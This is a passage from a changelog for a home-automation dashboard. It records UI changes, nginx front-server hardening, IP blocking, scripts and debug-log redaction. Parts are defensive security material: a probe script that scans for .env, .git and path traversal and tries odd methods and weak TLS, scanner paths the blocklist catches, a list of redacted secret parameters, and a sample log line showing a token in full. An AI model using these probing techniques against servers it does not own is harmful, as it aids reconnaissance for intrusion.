does** - which device the bridge is about to be told to forget, how the Wi-Fi
controller is logged in to, how long editing stays unlocked. There were eight
with nothing; there are none.

**And fifty-odd buttons.** Not the plain ones - *Save rules* says what it does
- but every one that talks to a machine, throws something away, or costs
money. What *Open network* means while it is open, and that any device in
range can join. That *Optimise* holds the database while it runs. That *Clear
out noise* says what it would remove before removing it. That *Upload a
backup* loses everything recorded since that backup was made. That *Ask the
network* may be charged for by the operator, and that a mark in a text message
drops a part from 160 characters to 70. What each of the four key buttons
does, and that the download is the private half and is written into the audit
log. The four dialogue buttons - *OK*, *Cancel*, *Confirm*, *Close* - say what
they decide.

`test/render.js` now refuses a page with a dropdown that says nothing, or with
any of the eight buttons that cannot be undone left silent.

3.97.1 — the panel Settings got yesterday is now **everywhere on the page**.

Anything carrying more than a label's worth of explanation says it in the
page's own panel rather than in the browser's tooltip - which waits a second,
wraps where it likes, cannot hold a line break or an icon, and on a
touchscreen cannot be reached at all. **154 things across every tab**, and not
one of them was reworded to do it: the words already there are the words in
the panel, and the `title` stays for screen readers and for touch-and-hold.

The sweep hangs off one observer watching the page, so whatever is drawn - a
tab, a card, a dialogue opened by a button - is taken a moment after it
appears. Hooking the drawing passes instead caught most of it and missed
everything inside a dialogue, which is exactly where the longest explanations
live.

**And the tables that explained nothing now do.** Every column of the press
log, the story of an address and the events table says what it holds, with the
marks it can carry: what a folded press means and why it is one line, which
road is the quiet one and why, what the globe beside a blocked address says,
which of the hand and the robot did it and which of them wins.

The cards that already explained themselves - the sensors, the guides, the
notes under each heading - are untouched.

3.97.0 — **Settings, rearranged.** It had grown into fourteen cards of
whatever had been added most recently, with labels that ran to a paragraph and
things that belong together sitting in different sections.

**Eighteen sections now, grouped by what somebody is trying to do** rather
than by which part of the daemon reads the setting. The three debug switches
lived in two different sections and are one card, *What gets written down*,
with the press log beside them. Warning about a device and noticing one has
gone quiet are two different questions and two cards. Heating and weather part
company; so do watching over things and mending bindings; so do the one-tap
links and the second factor. And *Heating* had been spilling into a second
card headed **weather_place** - a key name, drawn as a title - which is gone.

**A label is a few words; the long word waits under the pointer.** Hovering a
setting opens a panel in the same style the charts use, holding the whole of
what it does, the key it has in **config.json**, what that file says, what is
running now, and a line in green or amber: *the same as the file*, or *changed
here, so the file is not what is running*. The overridden mark on the row
stays as it was. Every label fits on a line - the longest is now a few words
where several ran past sixty characters.

Nothing was reworded to do it: the sentences that were labels are the
descriptions, and the twenty-one that had no natural short form were given
one. All 103 settings are still there, and `test/render.js` refuses a page
where a label runs to a paragraph, a section is headed by a key name, or the
popup does not name the key in config.json.

3.96.2 — **the export was leaving keys and scripts behind.** It carried the
router's private key and nothing else of the kind: not the front server's key,
which is a week old, not the access points', and not the public half of any of
them. The little scripts were not in it either, which has been true since they
went in.

All of it travels now, under one `keys` heading. The **private** halves go
only into an export that asked for the secrets, as before. The **public**
halves go into both - they are not secret, they are the lines you paste onto
the router, the proxy and the access points, and a restore that leaves them
out means finding them again by hand on the day the machine is being put back
together, which is the day a backup is meant to save.

An export written before this is still understood: the old `mikrotik_key` on
its own is read where the new heading is absent.

The words on the export button say what is in it now, the proxy password and
the private keys included, and the backups card lists the scripts and the
public halves.

3.96.1 — three things, and the middle one was a race I made worse yesterday.

**A new key did not appear until the page was reloaded.** The panel says what
it said when it was drawn, and asking the settings to be drawn again does not
reach it while anything else on the page is unsaved. It refreshes itself now.
While in there, the router and the server in front were given **one panel
between them** rather than two copies of the same four buttons.

**The router was told to add the same address several times over.** A blocked
list that gains six addresses at once - which is exactly what reading a
scanner out of the proxy log does - started six syncs, and every one of them
read the router before any had written to it, so each decided the same address
was missing and added it. The router answered *already have such entry* to
five of them. One sync at a time now, the reading of the router included. Six
addresses blocked at once: six adds, no duplicates.

**And the reading of the log carries on where it stopped.** It always
remembered the offset, but it wrote down the file's size rather than where the
reading actually ended - so a chunk cut off at the two-megabyte ceiling took
the rest with it, unread. It records where it stopped, and leaves a
half-written last line for next time. A log rotated away underneath is
noticed by its size and read from the top. Checked: three lines, then nothing,
then the two that were added, then a rotation read from the top and nothing
after it.

3.96.0 — **the server that faces the internet is read**, and what its log
saw counts.

That log is the only place that sees what the public tries and gives up on:
the paths that are not there, the methods nobody uses, the bursts the rate
limiter turned away. None of it ever reaches the house, so none of it was ever
weighed - and it is exactly the traffic worth weighing.

A section of its own in Settings, beside the router's: its address, port and
user, **a key or a password** with the same panel the router has (make a key,
use my own, download it, forget it - written once now and used by both), the
full path of the log, whether to read it by itself and how often. The user it
logs in as needs to read one file and nothing else.

Only what has been added since the last reading is fetched - the offset is
remembered, a log that has grown by four lines costs four lines, and one that
has shrunk was rotated and is read from the top. A first reading takes at most
the last two megabytes. *Try the log* shows the last five lines and weighs
nothing; *Read it now* weighs what has arrived; *Read it from the top* starts
again.

What it finds goes through the same counting as everything else, with weights
of its own: a path that is not there counts 2, something refused 3, a burst 3
- lighter than a wrong secret here, because a crawler finds a path by accident
and a secret only by trying. So a scanner walking `/.env`, `/wp-login.php`,
`/admin`, `/.git/config` ends on the same blocked list, and from there on the
router's firewall.

**And the page says where a thing was seen.** A line the front server saw
carries a globe - on the blocked address, on its counter, and in the story of
an address - and the reason says *(seen at the server in front)*. What
happened at the door and what happened in the house are different things and
now look it.

3.95.0 — a reading of the page for faults and for things that do not match
each other, walked across every tab and section rather than the card being
worked on at the time. Two kinds of inconsistency found, both of them the sort
that make a dashboard feel unfinished without ever breaking.

**Five command buttons had no icon** where every other one does: the confirm
dialogue's own *OK* and *Cancel* - the two that decide the most - the alert
band's *Clear*, *Everything here is right - remember it*, and *Change this*
beside the one-tap mode strip. All five carry one now. What is left without an
icon is meant to be: the `6h / 24h / 7d` chips are text choices, and `{ }
Facts` and `{ } Variables` wear the braces as their mark.

**Half the save buttons looked locked and half did not**, though all of them
have always asked for the PIN. The lock is put on by a hand-kept list, and the
editors' own saves were never added to it - the SMS commands, the one-tap
links, the SMS gateway, the action and sensor groups, the ACL mender, the
permit-join button. A locked dashboard where half the saves are dimmed says
nothing at all. The *add a row* buttons are still left alone, because adding a
row changes nothing until it is saved.

Checked while there: no id is used twice anywhere on the page, no escape is
shown as text, no box is drawn without the page's shape, and the whole walk
raises no error in the console. `test/render.js` now carries the id and icon
checks, so they are asked on every release rather than when somebody notices.

3.94.1 — the probe reads a server as an attacker does, not as somebody who
wrote it. It no longer assumes it is looking at a zigmon front: it runs a
blind path scan (admin pages, `.git`, `.env`, keys, phpinfo, path traversal
plain and encoded), tries odd methods (TRACE, PUT, DELETE, CONNECT), a Host
nobody serves to find a default vhost, an X-Forwarded-Host reflection, and
old TLS down to SSLv3, and only then looks for the one-tap road if it answers
at all. It can be pointed at an IP with `--host <name>` so the certificate is
checked against the name it is actually for. And **findings are shown whole** -
a security report with the reason cut off mid-word is worse than a long line.

3.94.0 — **tools/probe-front.py**: a standalone script that probes a one-tap
front server the way an attacker would, from outside. Point it at the
hostname the front answers on and it reads back what the public sees - the TLS
version and cipher, whether TLS 1.0/1.1 still answer, whether the certificate
verifies and how long it has left, whether plain HTTP redirects, whether
anything other than the one-tap road is reachable (the dashboard, the API, a
stray file), how `/tap` answers a GET and a burst of wrong secrets, and the
response headers. It never guesses a real secret and changes nothing on the
server, so it is safe against a live one, and it exits 0 or 1 so a cron can
mail you the day the answer changes. Standard library only; see tools/README.md.

3.93.1 — the front config ships with the real names and paths in it rather
than `tap.example.net`: the hostname, `/etc/nginx/certs/server.pem` and its
key and chain, the home server's address, the log names, the rate-limit zone.

**And it sends the home server its own name.** The Host it passed on was
`mqtt.example.net` - a name nobody answers to - and the home nginx picks its
server block by that header, so a press landed in whichever block happens to
be the default rather than the dashboard's. It works while there is only one
block on that port and stops the day a second one appears. The SNI carries the
same name, so the handshake is verifiable, and a note beside it says how to
make nginx actually verify it: `proxy_ssl_trusted_certificate` and
`proxy_ssl_verify on`, which it does not do by itself.

The obsolete advice about `set_real_ip_from` on the home server is gone from
the top of the file; it points at **trusted_proxies** instead, which is where
that belongs since 3.90.1.

3.93.0 — the front server in `deploy/nginx-tap-front.conf` **named no cipher
list**, so nginx used its own default - `HIGH:!aNULL:!MD5` - which still
offers the TLS_RSA suites. There the key exchange is the server's own RSA key
and there is no forward secrecy at all: record the traffic today, take the key
some other day, read it. Qualys marks each of them WEAK and caps the whole
server at **B** for it, which is what a report on a live one showed.

It now names the same ECDHE-only list the home server uses, with
`ssl_ecdh_curve` beside it, and staples its own OCSP answer so every visitor
is saved a trip to the CA. TLS 1.3's own suites are untouched - they all carry
forward secrecy.

A note beside it says what to do where that nginx serves other sites too: the
list in this server block covers this hostname only, and setting it once at
the `http` level covers the machine.

`test/nginx.py` reads the list with the comments stripped and refuses one that
offers `TLS_RSA`, CAMELLIA, 3DES, RC4 or a bare `AES128-SHA`, or that offers
nothing with forward secrecy at all.

3.92.3 — **debug_secrets was drawn as a masked box to type a secret into**,
for a setting that is yes or no. The kind of a box was guessed from the name
first - anything with *password*, *token* or *secret* in it is a secret - and
only then from what the setting actually takes. What it takes is known; the
name is a hint. A setting that takes 0 or 1 is a switch now, whatever it is
called, and `test/inputs.py` refuses any other that ends up masked while
taking a number or a switch.

3.92.2 — a reading for faults and lag. One finding, and it is the kind that
only shows itself a year later.

**Nothing ever trimmed the press log.** A link open to the internet writes a
line for every press and every refusal, and the story of an address writes two
for every block: both tables grew for ever while everything else in the
database was tidied nightly. They are trimmed with the rest now, at
**retain_presses_days** - half a year as it comes, and a setting like the
others. Eight thousand presses in a soak wrote eight thousand rows and not one
of them would ever have gone.

Everything else measured where it was or better: the status a third of a
millisecond, a message preview eight tenths, the blocked list with five
hundred addresses **5.5 ms** including the sweep of anything expired, the
sweep itself two hundredths when nothing is due, one MQTT message fourteen
thousandths. Reading the headers and blotting an address are both too small to
measure. Five hundred blocks expiring at the same moment take 37 ms, once.

A soak of eight thousand presses: five seconds, memory 25 MB to 28, the
anomaly map holding its cap of five hundred addresses, the write queue empty
at the end.

3.92.1 — **debug_secrets** now means everything open, not only the headers
and the addresses:

- a body is no longer cut off at four hundred characters, which is exactly
  where the thing being looked for tends to be - what goes to a plug, what
  comes back, what goes over MQTT
- what Duo answered is written as it answered it, rather than the four fields
  worth summarising
- a header value is carried whole rather than to two hundred characters

With it off, all of that shortens again as it did: a body to four hundred
characters, a Duo answer to its result and its ticket, a header to two
hundred. One switch, one meaning - the log is either a reading of what
happened or a tidy summary of it, and while something is being sorted out the
first is what is wanted.

3.92.0 — a reading for faults and leaks after a week of work on the one-tap
roads. One finding, and it is mine and recent.

**The debug log was writing session tokens out whole.** A secret in an address
is blotted by the name it travels under - `token=`, `secret=`, `key=`, `t=` -
and `session=` was not on that list. The page puts a session on every request
it makes, so a house running with debug on had a log full of working keys,
each good for as long as the session lasts. `pin=` was not on the list either,
so a PIN written into a query was written into the log beside it. Both are
now, along with `password`, `code`, `skey` and `ikey`; with **debug_secrets**
on they are shown whole, as that setting exists to do.

Measured and found unchanged: 135 reads answered without a PIN and not one
held anything secret; no POST name acted without a PIN; the reads that hold
passwords refuse a browser and answer a local tool holding the token. Six
threads drawing the blocked list and sweeping it at once, and four running a
script while the writer thread worked, came through without a word of trouble.

3.91.4 — a block whose time had run out **stayed on the list for ever**,
saying *0 min*, while the router had already dropped its own rule by timeout
and the history said nothing about it ending.

It came off only when that one address asked for something again - which is
the one thing an address that has been let back in has no particular reason to
do. They are swept now: when the list is drawn, and once a minute whether or
not anybody is looking, so the line goes, *let back in - ran out* is written
down, and the router is told.

3.91.3 — **debug_secrets**: the debug log shows a link's secret, a code and a
token whole rather than by their last four letters. Debugging the very path
that carries a secret is exactly when the shortening is in the way, and it is
the owner's own log on the owner's own machine.

It covers the headers and the addresses alike, and it is a thing to turn on
rather than the way things are: with it off - as it comes - an ordinary debug
session leaves no working key lying about in a file that outlives it. Settings
-> Keeping addresses out.

    off:  X-Zigmon-Tap: …xL6g | X-Zigmon-Code: …
    on:   X-Zigmon-Tap: E_Oc-um5Y1ryBhEGagpmsGv5uKz1xL6g | X-Zigmon-Code: 123456

3.91.2 — the headers went in on the API road only. They are on **every road
the daemon carries** now, all showing them the same way, because the question
they are asked is always the same one: what actually arrived, or what actually
went.

    api     headers  X-Zigmon-Tap: …TPnl | X-Zigmon-Client: 192.168.43.17 | …
    push    headers  User-Agent: ntfy | X-Zigmon-Token: …1234
    http    headers  Content-Type: application/json | Authorization: …cafe
    http    headers  Server: ShellyPlug | WWW-Authenticate: …5678

The push listener said nothing at all before - a push that never arrived and
one that arrived wrong looked exactly alike from the log - and a call out to a
plug showed its body but not what it was sent with. The shortening covers what
goes out and what comes back as well: an `Authorization`, a `WWW-Authenticate`
nonce, a `Set-Cookie`, a Duo signature.

3.91.1 — **the installer was writing its idea of the `/tap` block over yours**
on every upgrade, and then reporting that nginx had refused the result. It
carried a copy of the block as it stood in 3.54 - the rewrite form, no allow
rules, no fastcgi - and replaced whatever it found that differed from it.
A config on a running house has its own addresses, its own allow rules and a
server in front; writing over that does damage every time it runs.

It now looks before it touches. **The same** as the one in the package: it
says nothing at all. **Different**: *your own location = /tap is kept as it is*
and nothing is written. **Missing**: the block from the package is added -
from the file, so it cannot drift out of step with it again - and if nginx
refuses what came out, the file it copied first goes straight back rather than
being left broken.

It also counts braces rather than looking for the first `\n    }`, which is
inside the block's own `if` - the old way cut the file in half there, which is
what nginx was refusing.

3.91.0 — with debug on, the log shows **every header a request carried**:

    api 192.168.43.17 -> 89.24.57.142 "POST /api/tap HTTP/1.1" 200
    api    headers  Host: … | X-Zigmon-Tap: …2Br5 | X-Zigmon-Client: 192.168.43.17
                  | X-Zigmon-Via: 89.24.57.142 | X-Zigmon-Arg-Ip: 1.2.3.4
                  | User-Agent: BackgroundShortcutRunner/4711

Behind a server of its own, what arrived is the only way to tell a thing that
was sent from a thing that was dropped on the way, and the debug log is where
somebody looks for that.

A header whose value *is* the thing - a link's secret, a six-digit code, the
API token, a session, an Authorization or a Cookie - is shown as its last four
letters and nothing else, so one line can be told from another without the log
being worth stealing.

3.90.4 — the daemon's debug line named nobody. Everything reaches it over the
loopback from the relay, so the socket says 127.0.0.1 every time and the
address was left out altogether - which is no help at all when a press has
come through a server in front and the question is who made it.

Both are on the line now, and which of them is believed is visible in the
punctuation:

    api 192.168.43.17 -> 89.24.5.7   "POST /api/tap HTTP/1.1" 200
    api 10.9.9.9 says 1.2.3.4        "POST /api/tap HTTP/1.1" 200
    api 192.168.40.10                "POST /api/tap HTTP/1.1" 200

An arrow where the claim is believed - the server it came from is written
under **trusted_proxies** - and *says* where it is not, which is the same word
the press list uses. A press straight from the house names one address, as it
always did.

3.90.3 — the press arrived, nginx answered **200 with a megabyte of HTML**,
and the daemon never heard about it. `include fastcgi_params` was written
after the road's own `fastcgi_param QUERY_STRING api=tap` - and that file sets
`QUERY_STRING` to the request's own query, so it wiped it. PHP saw no query at
all and did what it does with none: served the dashboard page.

A 200 and a megabyte of HTML is a hard thing to read as a fault, which is the
worst part of it. The include comes first on both roads now, and
`test/nginx.py` refuses a config where it comes after.

3.90.2 — the shipped config had the front server's address written as
`192.168.47.17`, which is a transposition of the real one, and left as a
comment besides. Both roads now carry it as a line that does something:

    allow 192.168.43.17;          # <- the server in front

`test/nginx.py` reads the rules with the comments stripped out, so a road that
only talks about letting something through no longer passes for one that does.

3.90.1 — **the `set_real_ip_from` I put in yesterday undoes the allow rule
beside it.** real_ip rewrites the address *before* the access rules are read,
so the connection stops being the server in front and becomes whoever pressed
- and `allow 192.168.43.17` then matches nothing at all. The log fills with
real addresses and every press is refused, which is exactly the shape of the
trouble: the log looks right and nothing works.

Both lines are gone from the shipped config, with a note saying why they must
not come back. Whoever pressed is worked out **behind** nginx instead, where
it always was: the relay passes the `X-Forwarded-For` along under its own
name, and the daemon believes it only from an address written under
**trusted_proxies** in *Keeping addresses out*. Put the front server's address
there and the press list, the log and the counting all name the right person.

**And the rate limit now counts the presser, not the connection.** With a
server in front, every press arrives from that one address and a single bucket
was shared by the whole internet - one person pressing a lamp would exhaust it
for everybody. A `map` keys the zone on the forwarded address where there is
one and on the connection where there is not. Counting the wrong thing there
costs a 429 rather than a door left open, which is why it may believe a claim
the daemon still checks.

`test/nginx.py` refuses a config where either road brings `set_real_ip_from`
back, or where the limit is keyed on the connection.

3.90.0 — **a server in front may be let at the one-tap roads and at nothing
else.** Adding its address to the `allow` list at the top of the server opens
the whole dashboard to it; the shipped config now carries the rules inside the
two `/tap` locations instead, where they replace the ones above rather than
adding to them. Uncomment one line in each:

    allow 192.168.43.17;      # <- the server in front

Two things had to change for that to actually hold. The roads **hand the
request to PHP themselves** rather than rewriting it to `/index.php`: a
rewrite re-enters the location list and lands in the php block, where the
server's own rules apply again - and a front server allowed only on this road
would be refused there, which is the sort of thing that looks like it works
until somebody presses a link. And each road sets `set_real_ip_from` for that
server with `real_ip_header X-Forwarded-For`, so the log and the counting see
whoever really pressed rather than the machine that passed it on.

A link whose secret is in the address is worth thinking twice about before
letting a server in front reach it: the secret is in the URL, so it is in that
server's log. The header road carries nothing in the address at all.

`test/nginx.py` refuses a config where either road has no rules of its own,
where it goes round again instead of reaching PHP, or where it would count the
server in front as the presser.

3.89.2 — `\u2014` was being read out as itself on the scripts card and in five
other places. The page is PHP, and a backslash escape written into its markup
is a backslash, six characters where a dash was meant. Every one of them is
the character it stood for now, and `test/render.js` reads the whole page for
any that come back.

3.89.1 — a reading for lag, and one thing found that the earlier readings
could not have caught: they were taken on a house with nothing written under
*never kept out*.

**The blocked list took seventy milliseconds to draw, once a second.** What is
written there was read afresh for every address asked about, and the list asks
for every row - twice a row, as it happened. Five hundred blocked addresses
against thirty spared ranges came to **three hundred thousand** address
parses. It is read once and remembered until the setting changes, and asked
once a row: **72 ms down to 4.8**, with the sparing following the setting
exactly as before.

Everything else measured where it was: the status a third of a millisecond, a
message preview seven tenths, the presses tab under one with three thousand
rows behind it, the anomaly counters and the blocked-until check both too
small to measure, twenty scripts read in two hundredths and run in six.

`test/taps.py` now times the drawing as well as checking it, so a list that
grows slow says so rather than being noticed a year later.

3.89.0 — a reading of the whole of it after the scripts went in. Three
findings, one of them older than the scripts and worse than any of them.

**With no PIN set, the views that hold passwords were open to everybody.** The
lock asks `check_pin`, and with no PIN there is nothing to check, so it said
yes - to the export with the plug and router passwords in it, to the people
and their MAC addresses, to the blocked list. The installer does not set a PIN
unless it is asked to, so that was the state of a plain install. Those reads
are refused now whether or not a PIN exists, in words that say what to do:
*no PIN is set: set one in Settings before it can be shown*. The daemon says
the same in its log at startup. The command line reads them with its token as
before, so nothing is lost but the exposure.

**A script could be told to sleep for two and a half minutes.** `wait` was
capped at thirty seconds a line and not at all in total, and a script runs on
the thread that asked for it - a press holding its connection, a text holding
the modem. Thirty seconds now for the whole of it, and it says when it cut a
wait short.

**And a name filled in from a message could name the house itself.** A script
line written `on {thing}`, on a command anybody may text, would take
`sys:reboot` from a stranger's message as readily as a socket's name. A name
may no longer stand for `sys:`, `act:`, `rule:`, `sched:` or another script -
those may be written into a line by the person writing the script, which is a
different thing entirely.

Measured again and unchanged: 135 reads answered without a PIN and none held
anything secret; not one of the POST names acted without one.

3.88.0 — `zigmon --scripts` found it in one line:

    Ban   id 9b33e8f1
      ban {myip)

**A round bracket on the end.** `{myip)` is not a name, it is ordinary text,
so the line asked for an address called `{myip)` and the daemon answered
truthfully that it is not one. The script was right in every other way, and
nothing on the page or in the answer would ever have said which character was
wrong.

A name closed with the wrong bracket, or not closed at all, is **refused when
the script is saved**: *line 1: {myip) is not closed - a name ends with }*.
Ordinary brackets in ordinary words are left alone.

**And the reload really was blocking its owner.** 3.85.2 said a locked read is
not counted against whoever asked, and took the counting out of one of the two
places that refuse one. The other is the place the Public API tab meets twice
a second, so a reload went on filling the owner's own account until it earned
a block. Both are silent now: a hundred and twenty locked reads leave nothing
on the account. `test/taps.py` refuses to let either of them come back.

That is also why no PIN box appeared, and it is meant: since 3.85.2 a view
that wants the PIN says so in place of its lists, with an *Unlock editing*
button in it, rather than throwing a dialogue up once a second.

3.87.4 — still nothing banned, so: **a way to see what the daemon actually
holds**, and two more mouths opened.

`zigmon --scripts` prints them as they are kept, line by line, with the names
each one wants and a plain word where there is nothing in it:

    Ban   id d6c320a4   uses {myip}
      ban {myip} 120
      say banned

    Empty   id 89a7a469
      nothing in it - it would do nothing at all

**A script with no lines in it now says so.** It did nothing and said nothing,
and an answer written by hand went back as though it had worked - which is
exactly what an unsaved script body looks like from the outside. The answer
now carries *"Ban" has no lines in it*. So does a script whose every line was
skipped: *"Ban" did nothing*.

And the event log says how a run went rather than only that it happened:
*script "Ban" ran 1 line(s), 1 did not*.

3.87.3 — *Banned 1.2.3.4* came back and nothing had been banned. Two faults,
and the first is one I made yesterday.

**An answer written by hand was said whatever happened.** 3.87.2 let a command
say its own words instead of the script's - and then said them even when every
line of the script had failed, which is worse than the silence it replaced. It
still says them, and what did not happen is said after them: *Banned* /
*ban was not done: {myip} stood for nothing*. A line that worked is not talked
over.

**And a line naming something that is not here did nothing, quietly.** `on
No-Such-Plug` switched nothing and said nothing, which reads exactly like a
script that did its work. A line naming something outright is now refused when
the script is saved - *line 1: there is nothing here called "No-Such-Plug"* -
and one whose name comes from the message is refused as it runs, in those same
words, in the answer that goes back.

3.87.2 — the whole matrix, checked rather than assumed, and one thing found
in it.

**A command that wrote its own answer did not get to say it.** With a script
as its action, whatever the script said came back instead - so a reply reading
*Banned {ip}* was written, saved, and never seen. The command's own answer is
sent when there is one, with the names it caught filled in; the script's words
only when there is none.

Everything else was already right, and `test/taps.py` now holds all of it: a
name written into the phrase, one declared to take the words in order, one
declared as *the second word*, one taking everything after the phrase, one
declared nowhere at all, and two at once - then the same by a press, named
after its header, reading a header called something else, or taken from
whatever the press carried, one value or two.

3.87.1 — texting *ban 1.2.3.4* answered **{myip} is not an address**, because
the command had not been given a variable of that name and the script's
`{myip}` stood for nothing.

That was true and useless. **A script says which names it wants, and a rule
that declared none now gives them anyway**: the words after the phrase are
handed over in the order they came, so `ban 1.2.3.4` fills the `{myip}` the
script asks for without anything being set up. A one-tap link does the same
with whatever its press carried. Declaring a variable is now a way of being
particular - taking the second word, or everything after the phrase - rather
than something to remember before anything works at all.

A message with nothing after the phrase still keeps nobody out, and says which
name was empty rather than acting on what was left of the line.

3.87.0 — how a name gets into a script, said where it is written.

**A name in a script is filled in by whatever runs it.** Give the command or
the link a variable of that name and what it catches is what the script gets:
a command called *ban* with a variable `myip` runs `ban {myip} 120` against
the address the message carried. The card says so, and each script now shows
**which names it expects** - *uses {myip}* - beside its verbs.

***Try it* asks for them.** There is no rule to catch anything when a script
is tried from the dashboard, so the names it uses are asked for, one box each,
and it runs with those.

**And a name that stands for nothing no longer leaves a hole.** `ban {ip} 120`
with no address read as `ban 120`, which the daemon then answered with *120 is
not an address* - true, and no help at all. The line is not run, and it says
which name was empty: *ban was not done: {ip} stood for nothing*. Lines that
need no name still run.

3.86.3 — **Ctrl+Space in a script offered nothing**, while the `{ }` button
beside it offered everything. The list has always opened on a brace, because
everywhere else a name only means something inside one - and a script's lines
begin with a word. So the verbs were there, and there was no way to ask for
them where they are written.

The script box asks at the start of a line as well. `un` and Ctrl+Space now
offers `unban` first, drawn as a word rather than as `{unban}`, and picking it
writes `unban ` with a space after it rather than a brace. Inside braces
nothing changes: `say {ip` still offers the facts, with their braces, as it
did.

3.86.2 — the scripts card is held to its habits by `test/render.js` now: the
verbs have to arrive, the box has to offer them, and both buttons have to
carry an icon.

**And a request that never comes back no longer shuts the door behind it.**
The flag that stops a dozen of these being asked for at once was never let go
when an answer failed to arrive, so one lost request meant the verbs stayed
missing until the page was reloaded. It is let go after ten seconds whatever
happened.

That is also the end of the six failures the page walk has been reporting
since 3.80.1, and they were **mine only in the sense that my test rig was
wrong**: the web server it uses serves one request at a time unless told
otherwise, so everything queued behind the dashboard's own long poll and
timed out - the previews, the gateway measurement, the blocked line, all of
it. Told to use eight workers, as any real one does, the walk reports
`errors: none`.

3.86.1 — three things about the scripts card.

**Its two buttons had no icons** - *Add a script* and *Save scripts* were
written into the markup, and those are given their icons by name rather than
taking one themselves. Both have one now, and *Save scripts* wears the lock
like every other button that changes something.

**A script was listed under Sockets.** The heading a target falls under is
decided by what its name begins with, and `script:` was not among the things
that decision knew about, so each one landed in whatever heading came before
it. They have a heading of their own now - *Little scripts* - and so does *an
address the press carries*, which had the same trouble.

**And they are offered in the two places they belong**: as the action of a
text command and as the action of a one-tap link. Nowhere else - not in a
binding, not in a rule, not in a schedule - since a script exists to be given
the names a rule caught, and those other things catch none.

3.86.0 — **little scripts.** A rule does one thing; sometimes the thing wanted
is three. A script is a few lines of plain verbs with a name on it, picked as
the action of an SMS command or a one-tap link, and **the names that rule
caught are filled in before anything runs**:

    ban {ip} 120
    say {ip} is kept out for two hours
    on Plug-PorchLight

Eleven verbs, each of them something the dashboard could already do on its
own: `on`, `off`, `toggle`, `pulse`, `set`, `ban`, `unban`, `say`, `notify`,
`wait`, `stop`. Nothing here reaches further than the rest of the page does,
which is the whole point of writing it as lines rather than as code.

**Every line is checked when it is saved**, not when it runs, so one that
cannot work is refused while somebody is looking at it: *line 1: 'fly' is not
one of the things it can do*, *line 1: set needs a thing and a number*.
**Ctrl+Space in the box lists the verbs** with what each takes and an example,
beside every fact, and *Try it* runs the whole thing for real and says what
came back.

`ban {ip} 120` keeps an address out for two hours; with no number, for as long
as the settings say, and *permanent* still means until somebody takes it off.

3.85.3 — a name made on a rule was offered **twice**, and drawn as
`{{myip}}`.

Twice because both places that know about it were asked and neither knew about
the other: a name written into the phrase is also kept on the row, so
`ban {myip}` with a name called `myip` beside it said it once each. One name
once now, whoever mentioned it, in the list and in the `{ }` picker alike.

`{{myip}}` because the list draws the braces itself and I wrote another pair
into the label. Every other item is offered as a bare name; these are now too.

3.85.2 — **the dashboard was putting its owner on the blocked list for
pressing F5**, and throwing the PIN box up again and again while it did it.
One cause behind both.

Two of the views want the PIN, and the Public API tab asks for them once a
second. Every one of those refusals was **counted against the address that
made it** - two points each, three a second - so a few reloads from the sofa
built a score that ends in a block, and the right PIN typed afterwards did
nothing to clear it. A door announcing that it is locked is not somebody
trying the handle: those are not weighed at all now. Twenty reloads asking for
all three locked views leave nothing on the account.

**And a right PIN forgets what was held against that address.** Somebody who
knows it is not the person the counting is for.

**The PIN box no longer comes up by itself.** A view that wants the PIN offers
to unlock when a person presses something; the tab's own polling says so in
place of its lists, with an *Unlock editing* button where the person is
already looking. Measured over four seconds of polling on a locked tab: the
box was thrown up **nought times**, where before it came back after every
dismissal.

3.85.1 — the second box in the variables dialogue **did nothing at all on an
SMS command**. It was written down and then ignored: every name took the next
word whatever the box said, which makes it a control that does nothing, and
those are worse than no control.

It says which part of the message the name takes now. Empty: the next word, in
the order the names are written - `set {room} {temp}` against *set loznice
21.5*. `all`: everything after the phrase, spaces and all, for a note or a
sentence. A number: that word, so `2` is the second word after the phrase and
the order the names are written in stops mattering.

On a one-tap link it always had a use and keeps it: a name is the header name,
and the box is only for reading the value out of a header called something
else.

3.85.0 — the variables dialogue looks like the rest of the page, and what it
makes is offered where a person looks for it.

**The boxes had no shape and the buttons no icons** - a bare input beside
buttons that all have one. They have the shape every box on the page has, in
the typeface a name should be read in, and *Add a name* and *Done* carry
icons like everything else.

**A one-tap link has the same dialogue**, reached from its writing desk, and
there **a name is the header name**: one called `room` arrives in
`X-Zigmon-Arg-room`, with nothing else to set. The box beside it is only for
reading a name out of a header called something else.

**And what a rule makes up is offered on that rule**: at the top of the `{ }`
Facts picker under *This rule's own names*, as well as on Ctrl+Space, with a
word about where each comes from. They take the same turns of phrase
everything else does - `{ip.upper}`, `{args.count}`, `{plugs.nl}` - which they
always could, since the daemon applies those to whatever it is given.

They stay **local to the rule**. Two commands may each have a name called
`ip`; neither is offered on the other, and neither can read the other's.

3.84.0 — a reading of the whole of it for faults, leaks and lag. Three things
found, one of them mine and serious.

**The locked reads were open to anything on the machine.** 3.68.0 let a local
tool past the PIN so the command line could work, and asked only that the
request come from the loopback without the relay's name on it - not for the
API token. Anything able to open a socket to the daemon could therefore read
the export, passwords and all: the web server's own worker most of all, which
is the very thing an attacker would be trying to subvert. The token is
required now, and the command line sends it on reads as well as on writes -
it did not, so the road opened for it was one it could not take; a browser
coming by the relay is named by the relay and is refused as it always was.

**A badly written phrase stopped every message being read.** `set {x} to {x}`
names one group twice, which raises rather than answers - and that raising sat
in the path every incoming text goes through. A name mentioned twice now means
*the same thing twice* (`set 5 to 5` matches, `set 5 to 6` does not), and a
phrase that is no pattern at all answers no instead of throwing.

**A press could carry a book.** Values are held to two hundred characters and
to a name on every road, not only where a press arrives over the web, so a
value cannot be read out in full by whatever is listening to a report.

Measured, and well: one MQTT message **0.018 ms**, the status a third of a
millisecond, a message preview 0.7, the blocked list with five hundred
addresses on it 1.7, the press log searched across three thousand rows 2.1. A
sweep of every endpoint without a PIN answered 134 reads and leaked nothing
that looked like a secret; every one of the POST names refused to act.

3.83.0 — **a variable is a thing you make, not a spelling you have to
remember.** Every SMS command and every one-tap link has a *{ } Variables*
button beside its writing desk: add a name, say where it comes from, take it
away again.

For a command, a name takes its turn from the words after the phrase - a
command listening for *unban* with a name called `ip` catches *unban 1.1.1.1*
- or it can be written straight into the phrase as `unban {ip}`, which
declares it just the same and says so in the list. For a link, each name is
read out of a header: `X-Zigmon-Arg-ip` unless the row names another, so a
press can carry `X-Zigmon-Arg-Address` and have it arrive as `{ip}`.

**They belong to the row they were made on.** One called `ip` in this command
means nothing in the next, so they are offered on that row and nowhere else:
by Ctrl+Space, by the `{ }` picker, beside every other fact, marked with where
each comes from. Names are tidied when saved - nameless ones dropped, a
repeat kept once - and a command whose action is *ban* or *unban* now keeps
